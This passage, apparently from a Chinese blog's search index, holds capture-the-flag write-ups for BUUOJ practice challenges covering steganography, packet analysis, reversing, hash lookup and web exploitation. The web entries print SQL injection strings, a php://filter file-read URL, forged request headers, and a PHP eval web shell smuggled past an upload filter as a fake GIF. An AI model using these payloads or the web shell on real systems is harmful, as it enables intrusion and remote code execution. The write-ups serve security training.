class=\"line\"><span class=\"string\">show columns from words;--+</span></span><br><span class=\"line\"><span class=\"string\"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span></span><br></pre></td></tr></table></figure>\n<p>然后再用or访问一下，得到flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://d90a73f5-4781-43fb-8f2b-843befb62ce2.node4.buuoj.cn:81/?inject=1%27or%271%27=%271</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826103915.png\"><br>flag:<del>flag{58137d8f-17a7-45e9-9133-ed00429b6339}</del></p>\n<hr>\n<p>参考了：<a href=\"https://www.cnblogs.com/chalan630/p/12583667.html\">[强网杯 2019]随便注 By chalan630</a>](<a href=\"https://www.cnblogs.com/chalan630/p/12583667.html\">https://www.cnblogs.com/chalan630/p/12583667.html</a>)<br>#Web #Web/SQL注入<br>2021-08-26</p>\n","categories":["Web","SQL注入"]},{"title":"我吃三明治","url":"/2021/09/07/%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/","content":"<p><a href=\"https://buuoj.cn/challenges#%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB\">题目链接</a><br>附件下载解压，得到一张jpg文件：<br>![](/images/Writeup/20210907114234.png]<br>尝试使用[[Binwalk]分析一下结构：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ binwalk flag.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class=\"line\">37475         0x9263          JPEG image data, JFIF standard 1.01</span><br></pre></td></tr></table></figure>\n<p>用[[010Editor]看一下文件，看看在两个文件的连接处有没有信息（毕竟题目都提示说三明治了）：<br>![](/images/Writeup/20210907114746.png]<br>base解码看一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</span><br></pre></td></tr></table></figure>\n<p>base32解码一下，得到flag。<br>flag:<del>flag{6f1797d4080b29b64da5897780463e30}</del></p>\n","categories":["Misc","图片隐写"]},{"title":"数据包中的线索","url":"/2021/08/25/%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2/","content":"<p><a href=\"https://buuoj.cn/challenges#%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2\">题目链接</a><br>附件下载解压，发现是流量包数据，用[[工具/Misc/Wireshark|Wireshark]打开看看：<br>![](/images/Writeup/20210825200857.png]<br>发现了HTTP流：<br>![](/images/Writeup/20210825201116.png]<br>追踪出来的数据应该是Base64，解码看一下：<br>![](/images/Writeup/20210825201200.png]<br>![](/images/Writeup/20210825201227.png]<br>![](/images/Writeup/20210825201244.png]<br>flag:<del>flag{209acebf6324a09671abc31c869de72c}</del></p>\n","categories":["Misc","流量分析"]},{"title":"文件中的秘密","url":"/2021/08/25/%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86/","content":"<p><a href=\"https://buuoj.cn/challenges#%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86\">题目链接</a><br>附件下载解压，得到了”图片中的秘密.jpeg”一张图片，看起来也是没有问题，用[[Stegsolve]看一下文件信息，发现文件头尾的数据很多，看起来应该是藏在这里了，上下拖动一下便可以找到flag：<br>![](/images/Writeup/20210825145909.png]<br>当然，用[[010Editor]分析文件的数据会更简单：<br>![](/images/Writeup/20210825150145.png]<br>便得到了flag：<del>flag{870c5a72806115cb5439345d8b014396}</del></p>\n","categories":["Web","PHP代码审计","Misc","图片隐写"]},{"title":"新年快乐","url":"/2021/08/26/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/","content":"<p><a href=\"https://buuoj.cn/challenges#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90\">题目链接</a><br>拖进IDA分析一下：<br><img src=\"/images/Writeup/20210826211056.png\"><br>看来是加壳过了，无脑脱壳，过了：<br><img src=\"/images/Writeup/20210826211252.png\"><br>虽然还是提示文件损坏，但是至少能看见程序结构了。<br>F5逆向一下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;please input the true flag:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, &amp;Str1);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"built_in\">strncmp</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;Str1, Str2, <span class=\"built_in\">strlen</span>(Str2)))</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(aThisIsTrueFlag);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(Buffer);</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>看来输入的是&amp;Str1，然后与&amp;Str2作比较，说明flag数据在&amp;Str2里面，追踪一下…………还需要追踪吗，就在上面。。<br><img src=\"/images/Writeup/20210826211814.png\"><br>把&amp;Str2的数据输入未脱壳的程序，返回是正确的：<br><img src=\"/images/Writeup/20210826211930.png\"><br>flag:<del>flag{HappyNewYear!}</del></p>\n","categories":["Reserve"]},{"title":"权限获得第一步","url":"/2021/08/26/%E6%9D%83%E9%99%90%E8%8E%B7%E5%BE%97%E7%AC%AC%E4%B8%80%E6%AD%A5/","content":"<p><a href=\"https://buuoj.cn/challenges#%E6%9D%83%E9%99%90%E8%8E%B7%E5%BE%97%E7%AC%AC%E4%B8%80%E6%AD%A5\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::</span><br></pre></td></tr></table></figure>\n<p>看结构应该是MD5加密过的账号密码，用<a href=\"https://cmd5.com/\">CMD5</a>搜一下后面那串字符的原文就可以得到flag。<br>flag:<del>flag{3617656}</del></p>\n","categories":["Crypto","MD5"]},{"title":"极客大挑战 2019-BuyFlag","url":"/2021/09/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-BuyFlag/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BuyFlag\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://1fa030e9-97a3-4843-a636-03a91a5e7b42.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开来就是一个普通的主页，源码也没有信息，侧边菜单栏看一下：<br><img src=\"/images/Writeup/20210901085209.png\"><br>跳转到pay.php，看一下页面提示：<br><img src=\"/images/Writeup/20210901085236.png\"><br>看了一下网页源码，发现一段hint：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">\t~~~post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">\t<span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> (<span class=\"variable\">$password</span> == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么看来是post过去password和money来获取cookie。先看一下password：首先先校验了password是否为数字，是的话返回报错，不是数字的话则比较password是否为404，那么考虑使用%20作为特殊字符通过校验。<br><img src=\"/images/Writeup/20210901085807.png\"><br>但是提示说身份不对，尝试寻找cookie：<br><img src=\"/images/Writeup/20210901085838.png\"><br>将user的值改为1，通过身份校验：<br><img src=\"/images/Writeup/20210901085909.png\"><br>然后POST数据里面加上money=100000000，结果返回数据过长：<br><img src=\"/images/Writeup/20210901085957.png\"><br>看到这，自然想尝试一下科学计数法：<br><img src=\"/images/Writeup/20210901090033.png\"><br>得到了flag。<br>当然，根据漏洞，也可以构造：money[]=1来通过：<br><img src=\"/images/Writeup/20210901090138.png\"><br>flag:<del>flag{16d85973-715c-44cf-8f95-caf99c5512cb}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://www.cnblogs.com/zzjdbk/p/13641490.html\">[极客大挑战 2019]BuyFlag</a><br>2.<a href=\"https://blog.csdn.net/weixin_44348894/article/details/105333137\">[极客大挑战 2019]BuyFlag</a><br>2021-09-01</p>\n","categories":["Web","PHP代码审计"]},{"title":"极客大挑战 2019-EasySQL","url":"/2021/08/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-EasySQL/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://9d7ea079-7d1f-4c38-802f-e20efeb7424f.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826094307.png\"><br>随便输点数据看看返回值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://9d7ea079-7d1f-4c38-802f-e20efeb7424f.node4.buuoj.cn:81/check.php?username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210826094352.png\"><br>看来是字符类注入，用or注入一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://9d7ea079-7d1f-4c38-802f-e20efeb7424f.node4.buuoj.cn:81/check.php?username=admin&amp;password=admin&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>得到数据：<br><img src=\"/images/Writeup/20210826094529.png\"><br>flag:<del>flag{1db0b1ee-420f-4f19-a3df-acf5c1cd3aea}</del></p>\n<hr>\n<p>#Web #Web/SQL注入<br>2021-08-26</p>\n","categories":["Web","SQL注入"]},{"title":"极客大挑战 2019-Havefun","url":"/2021/08/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-Havefun/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://82432cd5-98a0-49ea-bc10-aee610ef8150.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>进入网页，<kbd>F12</kbd>看一下源代码，发现一段信息：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">        $cat=$_GET[&#x27;cat&#x27;];</span></span><br><span class=\"line\"><span class=\"comment\">        echo $cat;</span></span><br><span class=\"line\"><span class=\"comment\">        if($cat==&#x27;dog&#x27;)&#123;</span></span><br><span class=\"line\"><span class=\"comment\">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">        --&gt;</span></span><br></pre></td></tr></table></figure>\n<p>那就尝试传入cat=dog来看一下返回：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://82432cd5-98a0-49ea-bc10-aee610ef8150.node4.buuoj.cn:81/index.php?cat=dog</span><br></pre></td></tr></table></figure>\n<p>就得到了flag：<br><img src=\"/images/Writeup/20210826100031.png\"><br>flag:<del>flag{d6769dd5-bacd-48b7-bb27-611ded6ed5e9}</del></p>\n","categories":["Web"]},{"title":"极客大挑战 2019-Http","url":"/2021/08/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-Http/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://node4.buuoj.cn:26766/</span><br></pre></td></tr></table></figure>\n<p>看了一下页面信息，没发现有啥特别的地方，于是考虑抓包看看：<br><img src=\"/images/Writeup/20210830155545.png\"><br><img src=\"/images/Writeup/20210830155555.png\"><br>发现确实存在flag的痕迹，追踪看看：<br><img src=\"/images/Writeup/20210830155730.png\"><br><img src=\"/images/Writeup/20210830155803.png\"><br>那么就考虑构造Header发送：<br><img src=\"/images/Writeup/20210830160106.png\"><br>那么再伪造一下Agent：<br><img src=\"/images/Writeup/20210830160149.png\"><br>再伪造一下地址：<br><img src=\"/images/Writeup/20210830160238.png\"><br>最终的Header：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/Secret.php</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>node4.buuoj.cn:26766</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\">Referer:https://www.Sycsecret.com</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Syclover\t</span><br><span class=\"line\">X-Forwarded-For:127.0.0.1</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span><span class=\"punctuation\">: </span>UM_distinctid=17b942485b097e-0ebbcd4688e4a5-c343365-144000-17b942485b15b8</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{1c8ea787-5f5a-4c6d-a093-947492c601b7}</del></p>\n","categories":["Web","请求伪造"]},{"title":"极客大挑战 2019-Knife","url":"/2021/09/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-Knife/","content":"<p><a href=\"\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://49aaecc9-25d0-4ac0-a90e-2231c7f8f839.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开链接，提示靶机已经挂上马：<br><img src=\"/images/Writeup/20210830153047.png\"><br>用[[蚁剑)连接一下试试：<br><img src=\"/images/Writeup/20210830153216.png\"><br>可以连接，并且发现flag：<br><img src=\"/images/Writeup/20210830153303.png\"><br>flag:<del>flag{eef8c4da-9a18-48ec-84c2-9f5451bf9ada}</del></p>\n","categories":["Web","文件上传"]},{"title":"极客大挑战 2019-PHP","url":"/2021/09/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-PHP/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1d997fa1-d1d6-467e-9349-11a7c4364d98.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>进入网页。没发现有什么特别的东西，根据网站提示，尝试获取<a href=\"http://www.zip文件：\">www.zip文件：</a><br><img src=\"/images/Writeup/20210906091641.png\"><br><img src=\"/images/Writeup/20210906091735.png\"><br>发现<a href=\"http://www.zip文件内含有flag.php文件：\">www.zip文件内含有flag.php文件：</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{dog_dog_dog_dog}</del></p>\n","categories":["Web"]},{"title":"极客大挑战 2019-Secret File","url":"/2021/08/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-Secret%20File/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://3b5a73fb-98c6-46fc-9dbd-a34cea4b46af.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开来可以看见：<br><img src=\"/images/Writeup/20210826104355.png\"><br>F12看一下源代码，找到隐藏链接：<br><img src=\"/images/Writeup/20210826104444.png\"><br>进入之后，看到的是这个页面，顺着按钮点击，却告知我们已经错过了flag：<br><img src=\"/images/Writeup/20210826104535.png\"><br><img src=\"/images/Writeup/20210826104542.png\"><br>于是想到用[[Burp Suite)看一下网络包：<br><img src=\"/images/Writeup/20210826104750.png\"><br>看到了另一个隐藏页面：secr3t.php，访问一下试试：<br><img src=\"/images/Writeup/20210826104842.png\"><br>又指向到了flag.php这个页面：<br><img src=\"/images/Writeup/20210826105023.png\"><br>于是回头想到secr3t.php这个页面，有文件读取漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://00b5c733-809a-4aed-a498-27d306b09452.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>得到了flag的Base64的值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7OTIwOTFjYmYtYjYxYS00YTI2LWFmYmItNDRiYjY1M2E1M2U1fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>\n<p>解密之后得到了flag.php的代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>FLAG<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;background-color:black;&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;</span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span></span><br><span class=\"line\">            &lt;?php</span><br><span class=\"line\">                echo &quot;我就在这里&quot;;</span><br><span class=\"line\">                $flag = &#x27;flag&#123;92091cbf-b61a-4a26-afbb-44bb653a53e5&#125;&#x27;;</span><br><span class=\"line\">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class=\"line\">            ?&gt;</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{92091cbf-b61a-4a26-afbb-44bb653a53e5}</del></p>\n","categories":["Web","SQL注入"]},{"title":"极客大挑战 2019-Upload","url":"/2021/09/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019-Upload/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>打开链接，这肯定是上传类问题了：<br><img src=\"/images/Writeup/20210901162930.png\"><br>构建一句话挂马：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;script language=<span class=\"string\">&#x27;php&#x27;</span>&gt;@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pp&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>改后缀为phtml，开[[Burp Suite)抓包以下，顺便改一下包（校验文件格式是依赖header的）：<br><img src=\"/images/Writeup/20210901163123.png\"><br><img src=\"/images/Writeup/20210901163139.png\"><br>hearer改为以下数据后再放行：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /upload_file.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">3</span>b287f28-<span class=\"number\">6607</span>-<span class=\"number\">420</span>b-<span class=\"number\">95</span>bc-dcba771a0561.node4.buuoj.cn:<span class=\"number\">81</span></span><br><span class=\"line\">Content-Length: <span class=\"number\">357</span></span><br><span class=\"line\">Cache-Control: max-age=<span class=\"number\">0</span></span><br><span class=\"line\">Upgrade-Insecure-Requests: <span class=\"number\">1</span></span><br><span class=\"line\">Origin: http:<span class=\"comment\">//3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81</span></span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy2mzzN1AcBhRr0lk</span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64) AppleWebKit/<span class=\"number\">537.36</span> (KHTML, like Gecko) Chrome/<span class=\"number\">92.0</span>.<span class=\"number\">4515.159</span> Safari/<span class=\"number\">537.36</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,image/apng,*<span class=\"comment\">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class=\"line\"><span class=\"comment\">Referer: http://3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81/</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">------WebKitFormBoundaryy2mzzN1AcBhRr0lk</span></span><br><span class=\"line\"><span class=\"comment\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.phtml&quot;</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: image/jpeg</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">GIF89a</span></span><br><span class=\"line\"><span class=\"comment\">&lt;script language=&#x27;php&#x27;&gt;<span class=\"doctag\">@eval</span>($_POST[&#x27;pp&#x27;]);&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"comment\">------WebKitFormBoundaryy2mzzN1AcBhRr0lk</span></span><br><span class=\"line\"><span class=\"comment\">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">鎻愪氦</span></span><br><span class=\"line\"><span class=\"comment\">------WebKitFormBoundaryy2mzzN1AcBhRr0lk--</span></span><br></pre></td></tr></table></figure>\n<p>成功绕过格式校验。然后使用[[蚁剑)连接脚本：<br><img src=\"/images/Writeup/20210901163328.png\"><br>在网页根目录下发现flag：<br><img src=\"/images/Writeup/20210901163403.png\"><br>flag:<del>flag{821893be-7366-4df1-8f29-df09e7918b58}</del></p>\n","categories":["Web","文件上传"]},{"title":"看我回旋踢","url":"/2021/08/26/%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/","content":"<p><a href=\"https://buuoj.cn/challenges#%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</span><br></pre></td></tr></table></figure>\n<p>看题目说回旋踢，莫非，是rot13类加密？<br>写个脚本（仅小写字符）测试一下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span></span><br><span 